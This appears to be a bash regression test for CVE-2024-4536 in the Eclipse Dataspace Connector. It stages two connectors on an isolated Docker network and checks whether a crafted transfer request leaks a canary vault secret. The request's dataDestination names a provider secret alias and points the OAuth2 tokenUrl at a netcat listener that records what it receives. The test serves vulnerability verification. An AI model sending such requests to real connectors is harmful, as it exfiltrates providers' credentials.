#!/usr/bin/env bash
# CVE-2024-4536 regression test, DSP-driven (D7a) — faithful hostile-counterparty model.
# A consumer connector (iam-mock) negotiates a contract with the provider over DSP, then
# requests a transfer whose dataDestination (counterparty-controlled) is an OAuth2 HttpData
# sink naming a provider-vault secret (clientSecretKey) and a counterparty tokenUrl.
# 0.6.2 (sink OAuth2 decorator present) dereferences the named secret from the PROVIDER vault
# and posts it to the counterparty tokenUrl -> leak. 0.6.3 removed the sink decorator -> no leak.
# Oracle (receiver/API evidence only; log greps are observations):
#   FAIL = receiver saw POST /token and/or the canary value in its capture.
#   PASS = positive control holds (receiver saw the sink write) with NO token POST / no canary.
#   else INVALID with a reason. The canary value is never written to results/.
# Usage: ./42_test_4536_dsp.sh <edc-version>
source "$(dirname "$0")/lib.sh"   # set -euo pipefail, require_docker, COMMIT, JQ, DRIVER_IMG
V="${1:?usage: 42_test_4536_dsp.sh <edc-version>}"
IMG="gradle@sha256:963d59f7f22767da4efbcf46b661361b61af5fb88b0309da1071c4234c647eba"
RCV="alpine:3.20"; NET="pilot08v"; ALIAS="pilot08-canary"; DSPP="dataspace-protocol-http"
EDCNS="https://w3id.org/edc/v0.0.1/ns/"; DRV="$DRIVER_IMG"
case "$V" in 0.6*) PV=v2 ;; *) PV=v3 ;; esac
PK="pilot08-provider-mgmt"; CK="pilot08-consumer-mgmt"; ASSET="asset-4536"
jar="$PILOT/testbed/launcher/build/libs/pilot08-edc-$V.jar"
[ -f "$jar" ] || { echo "no jar for $V — build it first"; exit 1; }
sha="$(sha256sum "$jar" | cut -d' ' -f1)"
want="$(grep "^$V," "$PILOT/env/vanilla-jars.csv" 2>/dev/null | cut -d, -f2)"
[ -n "$want" ] || { echo "no recorded sha for $V in vanilla-jars.csv — build it first"; exit 1; }
[ "$want" = "$sha" ] || { echo "jar sha mismatch for $V (built!=recorded) — rebuild"; exit 1; }
CANARY="pilot08-canary-$(head -c 16 /dev/urandom | od -An -tx1 | tr -d ' \n')"
trap 'docker rm -f pilot08v-provider pilot08v-consumer pilot08v-receiver >/dev/null 2>&1 || true' EXIT

docker network inspect "$NET" >/dev/null 2>&1 || docker network create --internal "$NET" >/dev/null
[ "$(docker network inspect "$NET" --format '{{.Internal}}')" = true ] || { echo "network $NET not internal"; exit 1; }
docker rm -f pilot08v-provider pilot08v-consumer pilot08v-receiver >/dev/null 2>&1
# receiver: log method+path of each request to /cap.txt and reply with a valid token
docker run -d --name pilot08v-receiver --network "$NET" --network-alias receiver "$RCV" sh -c \
  'while true; do printf "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nContent-Length: 42\r\nConnection: close\r\n\r\n{\"access_token\":\"x\",\"token_type\":\"Bearer\"}" | timeout 15 nc -l -p 9300 >> /cap.txt 2>&1; echo "===END===" >> /cap.txt; done' >/dev/null

run="$PILOT/build/run"; mkdir -p "$run/p" "$run/c"
cp "$jar" "$run/p/app.jar"; cp "$PILOT/testbed/launcher/config/provider.properties" "$run/p/"
cp "$jar" "$run/c/app.jar"; cp "$PILOT/testbed/launcher/config/consumer.properties" "$run/c/"
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-provider --network "$NET" --network-alias provider -v "$run/p":/work -w /work "$IMG" \
  java -Dedc.fs.config=/work/provider.properties -Dpilot08.canary.alias="$ALIAS" -Dpilot08.canary.value="$CANARY" -jar /work/app.jar >/dev/null
MSYS_NO_PATHCONV=1 docker run -d --name pilot08v-consumer --network "$NET" --network-alias consumer -v "$run/c":/work -w /work "$IMG" \
  java -Dedc.fs.config=/work/consumer.properties -jar /work/app.jar >/dev/null
for n in provider consumer; do for _ in $(seq 1 60); do docker logs "pilot08v-$n" 2>&1 | grep -q ' ready' && break; sleep 2; done; done
seeded=no; docker logs pilot08v-provider 2>&1 | grep -q 'seeded canary secret' && seeded=yes

# req METHODISH... -> captures body + trailing HTTPCODE:nnn ; code() / body() extract.
req() { docker run --rm --network "$NET" "$DRV" -s -w '\nHTTPCODE:%{http_code}' --max-time 25 "$@" 2>/dev/null || true; }
code() { printf '%s' "$1" | grep -oaE 'HTTPCODE:[0-9]+' | tail -1 | cut -d: -f2; }
body() { printf '%s' "$1" | sed 's/HTTPCODE:[0-9]*$//'; }
pmgmt() { req -X POST "http://provider:8181/management/$1/$2" -H 'Content-Type: application/json' -H "X-Api-Key: $PK" -d "$3"; }
cmgmt() { req -X POST "http://consumer:8181/management/$1/$2" -H 'Content-Type: application/json' -H "X-Api-Key: $CK" -d "$3"; }
cget()  { req "http://consumer:8181/management/$1/$2" -H "X-Api-Key: $CK"; }

# provider seeds asset + permissive policy + contract definition (assets are always /v3)
r="$(pmgmt v3 assets '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"'"$ASSET"'","properties":{"name":"d"},"dataAddress":{"@type":"DataAddress","type":"HttpData","baseUrl":"http://receiver:9300/data"}}')"; seed_asset="$(code "$r")"
r="$(pmgmt "$PV" policydefinitions '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"pol-open","policy":{"@context":"http://www.w3.org/ns/odrl.jsonld","@type":"Set"}}')"; seed_policy="$(code "$r")"
r="$(pmgmt "$PV" contractdefinitions '{"@context":{"@vocab":"'"$EDCNS"'"},"@id":"cd-4536","accessPolicyId":"pol-open","contractPolicyId":"pol-open","assetsSelector":[]}')"; seed_cd="$(code "$r")"

# consumer fetches the provider catalog and extracts the offer id for our asset
CATREQ='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"CatalogRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","protocol":"'"$DSPP"'"}'
rc="$(cmgmt "$PV" catalog/request "$CATREQ")"; cat_code="$(code "$rc")"; catbody="$(body "$rc")"
offer="$(printf '%s' "$catbody" | "$JQ" -r '[.["dcat:dataset"]]|flatten|.[]|select(.["@id"]=="'"$ASSET"'")|.["odrl:hasPolicy"]|if type=="array" then .[0] else . end|.["@id"]//empty' 2>/dev/null || true)"
echo "seed asset=$seed_asset policy=$seed_policy cd=$seed_cd ; catalog=$cat_code ; offer=${offer:0:36}"

negId=""; agr=""; trId=""; tstate=""
if [ -n "$offer" ]; then
  NEG='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"ContractRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","protocol":"'"$DSPP"'","policy":{"@context":"http://www.w3.org/ns/odrl.jsonld","@type":"Offer","@id":"'"$offer"'","assigner":"provider","target":"'"$ASSET"'"}}'
  rn="$(cmgmt "$PV" contractnegotiations "$NEG")"; neg_code="$(code "$rn")"; negId="$(body "$rn" | "$JQ" -r '.["@id"]//empty' 2>/dev/null || true)"
  for _ in $(seq 1 40); do st="$(body "$(cget "$PV" contractnegotiations/"$negId")")"; agr="$(printf '%s' "$st" | "$JQ" -r '.["contractAgreementId"]//empty' 2>/dev/null || true); s="$(printf '%s' "$st" | "$JQ" -r '.["state"]//empty' 2>/dev/null || true); { [ -n "$agr" ] || [ "$s" = FINALIZED ] || [ "$s" = TERMINATED ]; } && break; sleep 2; done
fi
if [ -n "$agr" ]; then
  TR='{"@context":{"@vocab":"'"$EDCNS"'"},"@type":"TransferRequest","counterPartyAddress":"http://provider:8282/api/v1/dsp","contractId":"'"$agr"'","assetId":"'"$ASSET"'","protocol":"'"$DSPP"'","transferType":"HttpData-PUSH","dataDestination":{"type":"HttpData","baseUrl":"http://receiver:9300/sink","oauth2:clientId":"consumer","oauth2:clientSecretKey":"'"$ALIAS"'","oauth2:tokenUrl":"http://receiver:9300/token"}}'
  rt="$(cmgmt "$PV" transferprocesses "$TR")"; tr_code="$(code "$rt")"; trId="$(body "$rt" | "$JQ" -r '.["@id"]//empty' 2>/dev/null || true)"
  for _ in $(seq 1 40); do ts="$(body "$(cget "$PV" transferprocesses/"$trId")")"; tstate="$(printf '%s' "$ts" | "$JQ" -r '.["state"]//empty' 2>/dev/null || true)"; case "$tstate" in COMPLETED|TERMINATED|STARTED) break;; esac; sleep 2; done
fi
sleep 4
cap="$(docker exec pilot08v-receiver sh -c 'cat /cap.txt 2>/dev/null' 2>/dev/null || true)"
src_get=no;   printf '%s' "$cap" | grep -qiE '(GET|POST) /data'  && src_get=yes || true
token_post=no;printf '%s' "$cap" | grep -qiE 'POST /token'       && token_post=yes || true
sink_write=no;printf '%s' "$cap" | grep -qiE '(POST|PUT) /sink'  && sink_write=yes || true
canary=no;    printf '%s' "$cap" | grep -qF "$CANARY"            && canary=yes || true
log_attempt=no; docker logs pilot08v-provider 2>&1 | grep -qF 'http://receiver:9300/token' && log_attempt=yes || true
canary_in_log=no; docker logs pilot08v-provider 2>&1 | grep -qF "$CANARY" && canary_in_log=yes || true

leak=no; { [ "$token_post" = yes ] || [ "$canary" = yes ]; } && leak=yes
verdict=INVALID; reason=""
if [ "$seeded" != yes ]; then reason="canary-not-seeded"
elif [ "$canary_in_log" = yes ]; then reason="canary-leaked-to-provider-log"
elif [ -z "$offer" ]; then reason="no-offer(catalog=$cat_code)"
elif [ -z "$agr" ]; then reason="no-agreement(neg=${neg_code:-NA})"
elif [ -z "$trId" ]; then reason="no-transfer(tr=${tr_code:-NA})"
elif [ "$leak" = yes ]; then verdict=FAIL
elif [ "$sink_write" = yes ]; then verdict=PASS
else reason="sink-write-not-observed(positive-control-failed,state=${tstate:-NA})"; fi

out="$PILOT/results/cve-2024-4536.csv"; mkdir -p "$PILOT/results"
[ -f "$out" ] || echo "edc_version,invariant,verdict,jar_sha256,commit" > "$out"
grep -v "^$V," "$out" > "$out.tmp" 2>/dev/null; mv "$out.tmp" "$out"
echo "$V,vault-scoping(CVE-2024-4536),$verdict,$sha,$COMMIT" >> "$out"
obs="$PILOT/env/cve-2024-4536-observations.csv"
hdr="edc_version,jar_sha256,commit,seed_asset,seed_policy,seed_cd,catalog,offer,neg_code,agreement,transfer_state,src_get,sink_write,token_post,canary_value,log_attempt,canary_in_log,verdict,invalid_reason"
[ -f "$obs" ] || echo "$hdr" > "$obs"
grep -v "^$V," "$obs" > "$obs.tmp" 2>/dev/null; mv "$obs.tmp" "$obs"
echo "$V,$sha,$COMMIT,$seed_asset,$seed_policy,$seed_cd,$cat_code,$([ -n "$offer" ] && echo yes || echo no),${neg_code:-NA},$([ -n "$agr" ] && echo yes || echo no),${tstate:-NA},$src_get,$sink_write,$token_post,$canary,$log_attempt,$canary_in_log,$verdict,$reason" >> "$obs"
echo "$V: seeded=$seeded offer=$([ -n "$offer" ] && echo y||echo n) agr=$([ -n "$agr" ] && echo y||echo n) tstate=${tstate:-NA} src_get=$src_get sink_write=$sink_write token_post=$token_post canary=$canary => $verdict ${reason:+($reason)}"
